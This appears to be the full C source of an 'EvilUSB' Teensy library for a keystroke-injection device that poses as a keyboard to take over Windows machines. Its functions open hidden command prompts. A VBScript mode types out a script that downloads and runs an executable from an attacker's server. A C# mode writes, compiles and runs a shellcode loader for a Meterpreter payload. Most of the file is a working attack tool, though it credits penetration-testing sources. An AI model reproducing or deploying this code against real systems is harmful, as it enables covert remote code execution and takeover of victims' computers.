// This file contains the functions used to make an EvilUSB Teensy Device
// By Josh Hale "sn0wfa11"

// This code is modified and expanded upon from the work of the following:
// Offensive Security's "Advanced Teensy Penetration Testing Payloads Project" Sept 2012
// https://www.offensive-security.com/offsec/advanced-teensy-penetration-testing-payloads/
// https://github.com/offensive-security/hid-backdoor-peensy
// IronGeeks PHUKD library
// http://www.irongeek.com/i.php?page=security/programmable-hid-usb-keystroke-dongle
// The Social Engineering Toolkit by TrustedSec (David Kennedy "ReL1k")
// https://www.trustedsec.com/social-engineer-toolkit/
// Kautilya by Sam Ratashok
// https://github.com/samratashok/Kautilya

// -----------------------------------------------------------------------------------------------------------------

// These constants are used to reboot the board
#define CPU_RESTART_ADDR (uint32_t *)0xE000ED0C
#define CPU_RESTART_VAL 0x5FA0004
#define CPU_RESTART (*CPU_RESTART_ADDR = CPU_RESTART_VAL)

// This function waits for drivers to load.
// Note that it uses the Numlock key as an indicator.
//
// @speed [unsigned int] Time in millisecs between numlock presses
// @delay [unsigned int] Time to wait in millisecs after drivers have been loaded.
//
// @return [void] A useful return value is not expected here

void wait_for_drivers(unsigned int speed, unsigned int dly_time)
{
  unsigned int cnt = 0;
  bool numLockTrap = is_num_on();  // Get the current status of the Numlock key
  while(numLockTrap == is_num_on()) // Press the Numlock key using @speed as the interval until the Numlock status changes.
  {
    led_blink(3,80);
    cnt++;
    press_numlock();
    delay(speed);
  }
  press_numlock(); // Press Numlock again to revert it to its original state.
  delay(dly_time); // Wait the dely time
  if (cnt > 18)    // If the cycle lasted longer than 18 presses restart the board before proceeding.
  {
    led_blink(2, 400);
    delay(10000);
    led_blink(3, 400);
    led_blink(3, 80);
    led_blink(3, 400);
    CPU_RESTART;   // This was necessary for some computers that would not correctly register the Teensy until after it restarted.
  }
}

// ----------------------------------------------------------------------------------------------------------------
// LED Functions

// This function blinks the Teensy's onboard LED.
//
// @blinkrate [int] Number of times to blink the LED
// @delaytime [int] Time to wait in millisecs between blinks.
//
// @return [void] A useful return value is not expected here

void led_blink(int blinkrate,int delaytime)
{
  for(int blinkcounter = 0; blinkcounter < blinkrate; blinkcounter++)
  {
    digitalWrite(led, HIGH);
    delay(delaytime);
    digitalWrite(led, LOW);
    delay(delaytime);
  }
}

// ---------------------------------------------------------------------------------------------------------------
// Standard Key functions

// This function clears the Teensy's key inputs.
// This is a necessary function for Teensy operation.
//
// @return [void] A useful return value is not expected here

void clear_key(void)
{
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

// This function presses the designated key the designated number of times.
//
// @key [int] Key to be pressed.
// @amount [int] Number of times to press the key.
//
// @return [void] A useful return value is not expected here

void key_press(int key, int amount)
{
  for (int x = 0; x < amount; x++)
  {
    Keyboard.set_key1(key);
    Keyboard.send_now();
    clear_key();
  }
}

// This function presses the designated key the designated number of times with a 25 millisec delay between presses.
//
// @key [int] Key to be pressed.
// @amount [int] Number of times to press the key.
//
// @return [void] A useful return value is not expected here

void key_press_delay(int key, int amount)
{
  for (int x = 0; x < amount; x++)
  {
    Keyboard.set_key1(key);
    Keyboard.send_now();
    delay(25);
    clear_key();
  }
}

// This function presses the designated key the designated number of times with a 4 millisec delay between presses.
//
// @key [int] Key to be pressed.
// @amount [int] Number of times to press the key.
//
// @return [void] A useful return value is not expected here

void key_press_short_delay(int key, int amount)
{
  for (int x = 0; x < amount; x++)
  {
    Keyboard.set_key1(key);
    Keyboard.send_now();
    delay(4);
    clear_key();
  }
}
// ---------------------------------------------------------------------------------------------------------------
// Functions to control the computer

// This function runs a specific command on a Windows computer.
//
// @cmd [string] Command to be run.
//
// @return [void] A useful return value is not expected here

void run_command(char cmd[])  // uses the run prompt which has a limit of 260 characters
{
  capslock_off();
  key_press_delay(KEY_ESC, 1);

  delay(200);
  
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();
  
  clear_key();
  
  delay(800);
  
  Keyboard.println(cmd);
}

// This function hides an active Windows window.
// This function was specificly designed to hid a Windows Command Prompt window.
//
// @return [void] A useful return value is not expected here

void hide_window()
{
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  key_press_delay(KEY_SPACE, 1);
  delay(100);
  key_press_delay(KEY_M, 1);
  delay(100);
  key_press_short_delay(KEY_DOWN, 125);
  delay(25);
  key_press_delay(KEY_ENTER, 1);
  delay(200);
}

// This function opens the Windows start menu.
//
// @return [void] A useful return value is not expected here

void open_start_menu()
{
  key_press_delay(KEY_ESC, 1);

  delay(200);

  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.set_key1(KEY_ESC);
  Keyboard.send_now();

  delay (50);
  clear_key();
}

// This function opens a Windows Command Prompt.
//
// @return [void] A useful return value is not expected here

void open_cmd_prompt()
{
  run_command("cmd");
  delay(600);
}

// This function opens a Windows Command Prompt and runs the specified command.
//
// @command [string] Command to be run in the command prompt.
//
// @return [void] A useful return value is not expected here

void cmd_prompt_run(char cmd[])
{
  open_cmd_prompt();
  Keyboard.println(cmd);
}

// This function opens a Windows Command Prompt, hides the window, and runs the specified command.
//
// @command [string] Command to be run in the command prompt.
//
// @return [void] A useful return value is not expected here

void run_and_hide(char cmd[])
{
  open_cmd_prompt();
  hide_window();
  Keyboard.println(cmd);
}

// ---------------------------------------------------------------------------------------------------------------
// NUM, SCROLL, CAPS Led Functions and checking

// This function returns the status of the keyboard leds.
int ledkeys(void)       {return int(keyboard_leds);}

// These functions return the status of the scroll, numlock, and capslock keys.
// 
// @return [true] the key is on.
// @return [false] the key is off.

bool is_scroll_on(void) {return ((ledkeys() & 4) == 4) ? true : false;}
bool is_caps_on(void)   {return ((ledkeys() & 2) == 2) ? true : false;}
bool is_num_on(void)    {return ((ledkeys() & 1) == 1) ? true : false;}

// This function presses the num lock key.
//
// @return [void] A useful return value is not expected here

void press_numlock(void)
{
  Keyboard.set_key1(KEY_NUM_LOCK);
  Keyboard.send_now();
  delay(25);
  clear_key();
}

// This function presses the scroll lock key.
//
// @return [void] A useful return value is not expected here

void press_scrolllock(void)
{
  Keyboard.set_key1(KEY_SCROLL_LOCK);
  Keyboard.send_now();
  delay(25);
  clear_key();
}

// This function presses the caps lock key.
//
// @return [void] A useful return value is not expected here

void press_capslock(void)
{
  Keyboard.set_key1(KEY_CAPS_LOCK);
  Keyboard.send_now();
  delay(25);
  clear_key();
}

// This function makes sure that num lock is off.
// If not, it turns it off.
//
// @return [void] A useful return value is not expected here

void numlock_off(void)
{
  if (is_num_on())
    press_numlock();
}

// This function makes sure that caps lock is off.
// If not, it turns it off.
//
// @return [void] A useful return value is not expected here

void capslock_off(void)
{
  if (is_caps_on())
    press_capslock();
}

// This function makes sure that scroll lock is off.
// If not, it turns it off.
//
// @return [void] A useful return value is not expected here

void scrolllock_off(void)
{
  if (is_scroll_on())
    press_scrolllock();
}

// This function makes sure that num lock is on.
// If not, it turns it on.
//
// @return [void] A useful return value is not expected here

void numlock_on(void)
{
  if (!is_num_on())
    press_numlock();
}

// This function makes sure that caps lock is on.
// If not, it turns it on.
//
// @return [void] A useful return value is not expected here

void capslock_on(void)
{
  if (!is_caps_on())
    press_capslock();
}

// This function makes sure that scroll lock is on.
// If not, it turns it on.
//
// @return [void] A useful return value is not expected here

void scrolllock_on(void)
{
  if (!is_scroll_on())
    press_scrolllock();
}

// This function makes will return the num lock to its saved state.
//
// @old_status [bool] True = on, false = off
//
// @return [void] A useful return value is not expected here

void reset_numlock(bool old_status)
{
  if (is_num_on() != old_status)
    press_numlock();
}

// This function makes will return the caps lock to its saved state.
//
// @old_status [bool] True = on, false = off
//
// @return [void] A useful return value is not expected here

void reset_capslock(bool old_status)
{
  if (is_caps_on() != old_status)
    press_capslock();
}

// This function makes will return the caps lock to its saved state.
//
// @old_status [bool] True = on, false = off
//
// @return [void] A useful return value is not expected here

void reset_scrolllock(bool old_status)
{
  if (is_scroll_on() != old_status)
    press_scrolllock();
}

// This function checks the state of the numlock key on an interval for a change in the state.
//
// @reps [int] Number of times to check the state of the key for changes.
// @millisecs [int] Time to wait between checks
//
// @return [true] A change in status was identified during the checking.
// @return [false] No change was detected during the checking.

bool numlock_success(int reps, int millisecs)
{
  bool curr_status = is_num_on();
  numlock_off();
  int i = 0;
  do
  {
    delay(millisecs);
    if (is_num_on())
    {
      reset_numlock(curr_status);
      delay(50);
      return true;
    }
    i++;
  }
  while (!is_num_on() && (i<reps));
  reset_numlock(curr_status);
  return false;
}

// This function checks the state of the caps lock key on an interval for a change in the state.
//
// @reps [int] Number of times to check the state of the key for changes.
// @millisecs [int] Time to wait between checks
//
// @return [true] A change in status was identified during the checking.
// @return [false] No change was detected during the checking.

bool capslock_success(int reps, int millisecs)
{
  bool curr_status = is_caps_on();
  capslock_off();
  int i = 0;
  do
  {
    delay(millisecs);
    if (is_caps_on())
    {
      reset_capslock(curr_status);
      delay(50);
      return true;
    }
    i++;
  }
  while (!is_num_on() && (i<reps));
  reset_capslock(curr_status);
  return false;
}

// This function will check on a regular interval for the capslock status to change.
// This is for the Evil Keyboard program - See that program to explain why this logic is backwards from normal.
//
// @reps [int] Number of times to check the state of the key for changes.
// @millisecs [int] Time to wait between checks
//
// @return [true] Capslock status did not change
// @return [false] Capslock status did change

bool capslock_check(int reps, int millisecs)
{
  int i = 0;
  do
  {
    delay(millisecs);
    if (!is_caps_on())
    {
      delay(50);
      return false;
    }
    i++;
  }
  while (is_caps_on() && (i < reps));
  return true;
}

// This function checks the state of the scroll lock key on an interval for a change in the state.
//
// @reps [int] Number of times to check the state of the key for changes.
// @millisecs [int] Time to wait between checks
//
// @return [true] A change in status was identified during the checking.
// @return [false] No change was detected during the checking.

bool scrolllock_success(int reps, int millisecs)
{
  bool curr_status = is_scroll_on();
  scrolllock_off();
  int i = 0;
  do
  {
    delay(millisecs);
    if (is_scroll_on())
    {
      reset_scrolllock(curr_status);
      delay(50);
      return true;
    }
    i++;
  }
  while (!is_num_on() && (i<reps));
  reset_scrolllock(curr_status);
  return false;
}

// ------------------------------------------------------------------------------------------------------------------------------
// These functions will type out strings using the ASCII numberset. This is a slower way of typing that can come in handy.

// This function prints a line by typing out each char using its ASCII code.
//
// @string [string] Line to be typed out.
//
// @return [void] A useful return value is not expected here

void ascii_println(char string[])
{
  ascii_type_this(string);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  delay(100);
  clear_key();
  delay(100);
}

// This function types a string by typing out each char using its ASCII code.
//
// @string [string] string to be typed out.
//
// @return [void] A useful return value is not expected here

void ascii_type_this(char string[])
{
  int count, length;
  length = strlen(string);
  for(count = 0 ; count < length ; count++)
  {
    char a = string[count];
    ascii_input(ascii_convert(a));
  }
}

// This function types each character using the char's ASCII code (Alt + Code)
//
// @string [string] The string of numbers to be pressed to type out a specific ASCII char.
//
// @return [void] A useful return value is not expected here

void ascii_input(char string[])
{
  if (string == "000") return;
  int count, length;
  length = strlen(string);
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.send_now();
  for(count = 0 ; count < length ; count++)
  {
    char a = string[count];
    if (a == '1') Keyboard.set_key1(KEYPAD_1);
    if (a == '2') Keyboard.set_key1(KEYPAD_2);
    if (a == '3') Keyboard.set_key1(KEYPAD_3);
    if (a == '4') Keyboard.set_key1(KEYPAD_4);
    if (a == '5') Keyboard.set_key1(KEYPAD_5);
    if (a == '6') Keyboard.set_key1(KEYPAD_6);
    if (a == '7') Keyboard.set_key1(KEYPAD_7);
    if (a == '8') Keyboard.set_key1(KEYPAD_8);
    if (a == '9') Keyboard.set_key1(KEYPAD_9);
    if (a == '0') Keyboard.set_key1(KEYPAD_0);
    Keyboard.send_now();
    Keyboard.set_key1(0);
    delay(11);
    Keyboard.send_now();
  }
  clear_key();
}

// This function converts a char to its ASCII code.
//
// @string [string] char to be converted to ASCII.
//
// @return [string] returns a string of numbers representing the input char's ASCII code.
// @return "000" if not found in the list

char* ascii_convert(char string)
{
  if (string == 'T') return "84";
  if (string == ' ') return "32";
  if (string == '!') return "33";
  if (string == '\"') return "34";
  if (string == '#') return "35";
  if (string == '$') return "36";
  if (string == '%') return "37";
  if (string == '&') return "38";
  if (string == '\'') return "39";
  if (string == '(') return "40";
  if (string == ')') return "41";
  if (string == '*') return "42";
  if (string == '+') return "43";
  if (string == ',') return "44";
  if (string == '-') return "45";
  if (string == '.') return "46";
  if (string == '/') return "47";
  if (string == '0') return "48";
  if (string == '1') return "49";
  if (string == '2') return "50";
  if (string == '3') return "51";
  if (string == '4') return "52";
  if (string == '5') return "53";
  if (string == '6') return "54";
  if (string == '7') return "55";
  if (string == '8') return "56";
  if (string == '9') return "57";
  if (string == ':') return "58";
  if (string == ';') return "59";
  if (string == '<') return "60";
  if (string == '=') return "61";
  if (string == '>') return "62";
  if (string == '?') return "63";
  if (string == '@') return "64";
  if (string == 'A') return "65";
  if (string == 'B') return "66";
  if (string == 'C') return "67";
  if (string == 'D') return "68";
  if (string == 'E') return "69";
  if (string == 'F') return "70";
  if (string == 'G') return "71";
  if (string == 'H') return "72";
  if (string == 'I') return "73";
  if (string == 'J') return "74";
  if (string == 'K') return "75";
  if (string == 'L') return "76";
  if (string == 'M') return "77";
  if (string == 'N') return "78";
  if (string == 'O') return "79";
  if (string == 'P') return "80";
  if (string == 'Q') return "81";
  if (string == 'R') return "82";
  if (string == 'S') return "83";
  if (string == 'T') return "84";
  if (string == 'U') return "85";
  if (string == 'V') return "86";
  if (string == 'W') return "87";
  if (string == 'X') return "88";
  if (string == 'Y') return "89";
  if (string == 'Z') return "90";
  if (string == '[') return "91";
  if (string == '\\') return "92";
  if (string == ']') return "93";
  if (string == '^') return "94";
  if (string == '_') return "95";
  if (string == '`') return "96";
  if (string == 'a') return "97";
  if (string == 'b') return "98";
  if (string == 'c') return "99";
  if (string == 'd') return "100";
  if (string == 'e') return "101";
  if (string == 'f') return "102";
  if (string == 'g') return "103";
  if (string == 'h') return "104";
  if (string == 'i') return "105";
  if (string == 'j') return "106";
  if (string == 'k') return "107";
  if (string == 'l') return "108";
  if (string == 'm') return "109";
  if (string == 'n') return "110";
  if (string == 'o') return "111";
  if (string == 'p') return "112";
  if (string == 'q') return "113";
  if (string == 'r') return "114";
  if (string == 's') return "115";
  if (string == 't') return "116";
  if (string == 'u') return "117";
  if (string == 'v') return "118";
  if (string == 'w') return "119";
  if (string == 'x') return "120";
  if (string == 'y') return "121";
  if (string == 'z') return "122";
  if (string == '{') return "123";
  if (string == '|') return "124";
  if (string == '}') return "125";
  if (string == '~') return "126";
  Keyboard.print(string);
  return "000";
}

// ---------------------------------------------------------------------------------------------------------------------------------------
// These functions define the VBScript attack mode.
// This mode types out a VBScript that will download and execute a file.

// !!! NOTE: This will leave the executable on the target computer in the user's home directory. You will need to delete it after migration!!!

// set a standard delay between commands.
int cmd_break = 75;

// This function opens a command prompt, hides it, and types out the VBScript
//
// @address [string] IPv4 address and port number for the download ie "http://192.168.1.101:12056/"
// @filename [string] file to be downloaded ie "t.exe"
//
// @return [void] A useful return value is not expected here

void vbscript_run_and_hide(char address[], char filename[])
{
  open_cmd_prompt();
  hide_window();
  vbscript_download_and_run(address, filename);
}

// This function types out the VBScript, executes it, and then deletes it.
//
// @address [string] IPv4 address and port number for the download ie "http://192.168.1.101:12056/"
// @filename [string] file to be downloaded ie "t.exe"
//
// @return [void] A useful return value is not expected here

void vbscript_download_and_run(char address[], char filename[])
{
  capslock_off();
  Keyboard.print("del ");
  Keyboard.println(filename);
  delay(cmd_break);
  Keyboard.print("echo strFileURL = \"");
  Keyboard.print(address);
  Keyboard.print(filename);
  Keyboard.println("\" > this.vbs");
  delay(cmd_break);
  Keyboard.print("echo strHDLocation = \"");
  Keyboard.print(filename);
  Keyboard.println("\" >> this.vbs");
  delay(cmd_break);
  Keyboard.println("echo Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\") >> this.vbs");
  delay(cmd_break);
  Keyboard.println("echo objXMLHTTP.open \"GET\", strFileURL, false >> this.vbs");
  delay(cmd_break);
  Keyboard.println("echo objXMLHTTP.send() >> this.vbs");
  delay(cmd_break);
  Keyboard.println("echo If objXMLHTTP.Status = 200 Then >> this.vbs");
  delay(cmd_break);
  Keyboard.println("echo Set objADOStream = CreateObject(\"ADODB.Stream\") >> this.vbs");
  delay(cmd_break);
  Keyboard.println("echo objADOStream.Open >> this.vbs");
  delay(cmd_break);
  Keyboard.println("echo objADOStream.Type = 1 >> this.vbs");
  delay(cmd_break);
  Keyboard.println("echo objADOStream.Write objXMLHTTP.ResponseBody >> this.vbs");
  delay(cmd_break);
  Keyboard.println("echo objADOStream.Position = 0 >> this.vbs");
  delay(cmd_break);
  Keyboard.println("echo Set objFSO = Createobject(\"Scripting.FileSystemObject\") >> this.vbs");
  delay(cmd_break);
  Keyboard.println("echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> this.vbs");
  delay(cmd_break);
  Keyboard.println("echo Set objFSO = Nothing >> this.vbs");
  delay(cmd_break);
  Keyboard.println("echo objADOStream.SaveToFile strHDLocation >> this.vbs");
  delay(cmd_break);
  Keyboard.println("echo objADOStream.Close >> this.vbs");
  delay(cmd_break);
  Keyboard.println("echo Set objADOStream = Nothing >> this.vbs");
  delay(cmd_break);
  Keyboard.println("echo End if >> this.vbs");
  delay(cmd_break);
  Keyboard.println("echo Set objXMLHTTP = Nothing >> this.vbs");
  delay(cmd_break);
  Keyboard.println("cscript //nologo this.vbs");
  delay(1000);
  Keyboard.println("del this.vbs");
  delay(cmd_break * 2);
  Keyboard.println(filename);
  delay(cmd_break);
  Keyboard.println("exit");    
}

// ---------------------------------------------------------------------------------------------------------------------------------------------
// These function are for the C# attack method.
// This method types out a C# application that executes a Meterpreter Payload.
// Once typed out, this method uses the native .NET compiler to compile the code, it is then executed.

// !!! NOTE: This will leave a file "t.exe" on the target machine in the user's home directory. You will need to delete this after migration!!!

// This function opens a command prompt, hides it, and types out the C# program and executes it.
//
// @payload [string] The hex of the Meterpreter payload (Use Metasploit module /exploit/hex_generator to get this code.)
// @net_ver [char] The current .NET version - probably '4'
//
// @return [void] A useful return value is not expected here

void cs_run_and_hide(char payload[], char net_ver[])
{
  open_cmd_prompt();
  hide_window();
  cs_write_compile_run(payload, net_ver);
}

// This function types out the C# program and executes it.
//
// @payload [string] The hex of the Meterpreter payload (Use Metasploit module /exploit/hex_generator to get this code.)
// @net_ver [char] The current .NET version - probably '4'
//
// @return [void] A useful return value is not expected here

void cs_write_compile_run(char payload[], char net_ver[])
{
  capslock_off();
  Keyboard.println("del this.cs");
  delay(cmd_break);
  Keyboard.println("echo using System; namespace P {class Program { > this.cs");
  delay(cmd_break);
  Keyboard.println("echo private static Int32 MEM=0x1000; private static IntPtr PAGE=(IntPtr)0x40; private static UInt32 INF=0xFFFFFFFF; >> this.cs");
  delay(cmd_break);
  Keyboard.println("echo [System.Runtime.InteropServices.DllImport(\"kernel32\")] private static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr s,Int32 t,IntPtr p); >> this.cs");
  delay(cmd_break);
  Keyboard.println("echo [System.Runtime.InteropServices.DllImport(\"kernel32\")] private static extern IntPtr CreateThread(IntPtr att,UIntPtr st,IntPtr sa,IntPtr p,Int32 c,ref IntPtr id); >> this.cs");
  delay(cmd_break);
  Keyboard.println("echo [System.Runtime.InteropServices.DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr h,UInt32 ms); >> this.cs");
  delay(cmd_break);
  Keyboard.println("echo static void Main(string[] args) { >> this.cs");
  delay(cmd_break);
  Keyboard.print("echo byte[] sc=new byte[] {");
  Keyboard.print(payload);
  Keyboard.println("}; >> this.cs");
  delay(cmd_break);
  Keyboard.println("echo IntPtr m=VirtualAlloc(IntPtr.Zero,(UIntPtr)sc.Length,MEM,PAGE); System.Runtime.InteropServices.Marshal.Copy(sc,0,m,sc.Length); >> this.cs");
  delay(cmd_break);
  Keyboard.println("echo IntPtr id=IntPtr.Zero; WaitForSingleObject(CreateThread(id,UIntPtr.Zero,m,id,0,ref id),INF);}}} >> this.cs");
  delay(cmd_break);
  ascii_type_this("c:\\Windows\\Microsoft.NET\\Framework\\v");
  ascii_type_this(net_ver);
  key_press(KEY_TAB, 1);
  delay(100);
  Keyboard.println("\\csc.exe /target:winexe /nologo /platform:x86 /w:0 /out:t.exe this.cs");
  delay(500);
  Keyboard.println("del this.cs");
  delay(cmd_break * 2);
  Keyboard.println("t.exe");
  delay(cmd_break);
  Keyboard.println("exit");
}


